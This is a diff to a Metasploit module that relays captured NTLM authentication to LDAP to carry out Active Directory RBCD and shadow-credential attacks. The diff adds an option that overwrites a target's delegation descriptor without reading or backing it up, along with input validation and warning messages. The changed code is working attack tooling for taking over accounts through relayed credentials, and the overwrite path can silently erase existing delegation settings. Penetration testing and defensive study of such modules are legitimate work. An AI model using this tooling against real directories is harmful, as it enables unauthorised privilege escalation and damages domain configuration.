@@ -65,13 +65,14 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('LDAPDomain', [false, 'Domain for NTLM bootstrap authentication'], conditions: %w[BOOTSTRAP_AUTH == NTLM]),
       OptString.new('LDAPUsername', [false, 'Username for NTLM bootstrap authentication'], conditions: %w[BOOTSTRAP_AUTH == NTLM]),
       OptString.new('LDAPPassword', [false, 'Password for NTLM bootstrap authentication'], conditions: %w[BOOTSTRAP_AUTH == NTLM]),
-      OptString.new('TARGET_ACCOUNT', [true, 'Target sAMAccountName or distinguished name']),
+      OptString.new('TARGET_ACCOUNT', [true, 'Target sAMAccountName or full DN; DN required for RBCD with RBCDOverwrite or anonymous SHADOW_CREDENTIALS']),
       OptString.new('DELEGATE_FROM', [false, 'Existing controlled sAMAccountName or direct SID'], conditions: %w[ACTION == RBCD])
     ])
 
     register_advanced_options([
       OptString.new('BASE_DN', [false, 'Directory search base; discovered when possible']),
-      OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true])
+      OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
+      OptBool.new('RBCDOverwrite', [true, 'Replace the entire RBCD descriptor without reading or backing it up; requires a target DN and delegate SID', false], conditions: %w[ACTION == RBCD])
     ])
   end
 
@@ -86,6 +87,10 @@ class MetasploitModule < Msf::Auxiliary
       raise Msf::OptionValidateError, { 'RPORT' => 'LDAPS is not supported; use plaintext LDAP with SASL protection' }
     end
 
+    if action.name == 'SHADOW_CREDENTIALS' && datastore['BOOTSTRAP_AUTH'] == 'ANONYMOUS' && !distinguished_name?(datastore['TARGET_ACCOUNT'])
+      raise Msf::OptionValidateError, { 'TARGET_ACCOUNT' => 'Anonymous SHADOW_CREDENTIALS requires a full target DN to avoid directory lookups; use NTLM bootstrap to resolve an account name' }
+    end
+
     if action.name == 'RBCD' && datastore['DELEGATE_FROM'].blank?
       raise Msf::OptionValidateError, { 'DELEGATE_FROM' => 'DELEGATE_FROM must be set for the RBCD action' }
     end
@@ -95,6 +100,15 @@ class MetasploitModule < Msf::Auxiliary
         Rex::Proto::MsDtyp::MsDtypSid.new(datastore['DELEGATE_FROM'])
       rescue ArgumentError => e
         raise Msf::OptionValidateError, { 'DELEGATE_FROM' => e.message }
+      end
+    end
+
+    if action.name == 'RBCD' && datastore['RBCDOverwrite']
+      unless distinguished_name?(datastore['TARGET_ACCOUNT'])
+        raise Msf::OptionValidateError, { 'TARGET_ACCOUNT' => 'RBCDOverwrite requires a full target DN because directory lookups are skipped' }
+      end
+      unless datastore['DELEGATE_FROM'].start_with?('S-')
+        raise Msf::OptionValidateError, { 'DELEGATE_FROM' => 'RBCDOverwrite requires a direct SID because directory lookups are skipped' }
       end
     end
 
@@ -133,6 +147,10 @@ class MetasploitModule < Msf::Auxiliary
   #
   # @return [void]
   def run
+    if action.name == 'RBCD' && datastore['RBCDOverwrite']
+      print_warning('RBCDOverwrite is enabled: the entire RBCD descriptor will be replaced without being read or backed up. Existing delegation entries may be lost and cannot be restored by this module.')
+    end
+
     start_service
     print_status('Server started; waiting for an SMB NTLM authentication to relay. No coercion is performed.')
     service.wait if service
@@ -184,7 +202,8 @@ class MetasploitModule < Msf::Auxiliary
   # @return [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::Operation] prepared modification
   def prepare_relay_operation(ldap, discovered_base_dn, relay_target)
     base_dn = datastore['BASE_DN'].presence || discovered_base_dn
-    target = resolve_target(ldap, datastore['TARGET_ACCOUNT'], base_dn, read_attribute: action.name == 'RBCD' ? RBCD_ATTRIBUTE : nil)
+    read_attribute = RBCD_ATTRIBUTE if action.name == 'RBCD' && !datastore['RBCDOverwrite']
+    target = resolve_target(ldap, datastore['TARGET_ACCOUNT'], base_dn, read_attribute: read_attribute)
 
     if action.name == 'RBCD'
       prepare_rbcd_operation(ldap, target[:dn], target[:name], base_dn, relay_target)
@@ -234,29 +253,34 @@ class MetasploitModule < Msf::Auxiliary
       return { dn: entry.dn, name: candidate } if entry
     end
 
-    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: sAMAccountName #{target_account} was not found"
+    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: sAMAccountName #{target_account} was not found or is not visible to the #{datastore['BOOTSTRAP_AUTH']} bootstrap identity; check BASE_DN and directory read access"
   end
 
-  # Build an RBCD replacement that adds one ACE to the descriptor read during bootstrap.
+  # Build an RBCD update, preserving the current descriptor unless overwrite is explicit.
   #
   # @param ldap [Rex::Proto::LDAP::Client] bootstrap-authenticated LDAP client
   # @param target_dn [String] target distinguished name
   # @param target_name [String] target display name
   # @param base_dn [String, nil] directory search base
   # @param relay_target [Msf::Exploit::Remote::Relay::Target] current relay target
-  # @return [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::Operation] prepared RBCD replacement
+  # @return [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::Operation] prepared RBCD modification
   # @raise [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError] if the current descriptor cannot be read
   # @raise [Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::PreparationError] if the descriptor or recovery data is invalid
   def prepare_rbcd_operation(ldap, target_dn, target_name, base_dn, relay_target)
-    entry = ldap_search!(
-      ldap,
-      base: target_dn,
-      scope: Net::LDAP::SearchScope_BaseObject,
-      attributes: [RBCD_ATTRIBUTE]
-    ).first
-    raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: current #{RBCD_ATTRIBUTE} could not be established" unless entry
+    overwrite = datastore['RBCDOverwrite']
+    current_value = nil
+    unless overwrite
+      entry = ldap_search!(
+        ldap,
+        base: target_dn,
+        scope: Net::LDAP::SearchScope_BaseObject,
+        attributes: [RBCD_ATTRIBUTE]
+      ).first
+      raise Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::LookupError, "Lookup failed: current #{RBCD_ATTRIBUTE} could not be established" unless entry
 
-    current_value = entry[RBCD_ATTRIBUTE].first
+      current_value = entry[RBCD_ATTRIBUTE].first
+    end
+
     delegate = resolve_delegate_sid(ldap, datastore['DELEGATE_FROM'], base_dn)
     delegate_sid = delegate[:sid]
     current_descriptor = current_value && Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(current_value)
@@ -276,7 +300,9 @@ class MetasploitModule < Msf::Auxiliary
     Msf::Exploit::Remote::Relay::NTLM::Target::LDAP::ReauthenticationClient::Operation.new(
       dn: target_dn,
       attribute: RBCD_ATTRIBUTE,
-      type: :replace,
+      # A missing value may be hidden by LDAP access controls. Modify-add fails
+      # if this single-valued attribute already exists, preserving unknown data.
+      type: overwrite || current_value ? :replace : :add,
       attribute_values: [new_value],
       confirmation: lambda do |values|
         values.any? do |value|
@@ -288,7 +314,8 @@ class MetasploitModule < Msf::Auxiliary
       end,
       recovery: {
         backup_path: backup_path,
-        original_present: !current_value.nil?,
+        original_present: overwrite ? nil : !current_value.nil?,
+        overwrite: overwrite,
         delegate_sid: delegate_sid.to_s
       },
       metadata: {
@@ -494,7 +521,11 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Credential material remains at #{metadata[:credential_path]}; remove only device ID #{metadata[:device_id]} or the exact value at #{metadata[:recovery_path]} to recover")
     elsif metadata[:action] == 'RBCD'
       recovery = relay_connection.operation.recovery
-      print_status("RBCD recovery: remove only the ACE for SID #{recovery[:delegate_sid]}#{"; original descriptor stored at #{recovery[:backup_path]}" if recovery[:backup_path]}")
+      if recovery[:overwrite]
+        print_warning('RBCD recovery: the original descriptor was not read or backed up. Removing the added ACE cannot restore overwritten entries; restore previous settings from an independent backup.')
+      else
+        print_status("RBCD recovery: remove only the ACE for SID #{recovery[:delegate_sid]}#{"; original descriptor stored at #{recovery[:backup_path]}" if recovery[:backup_path]}")
+      end
     end
   end
 end
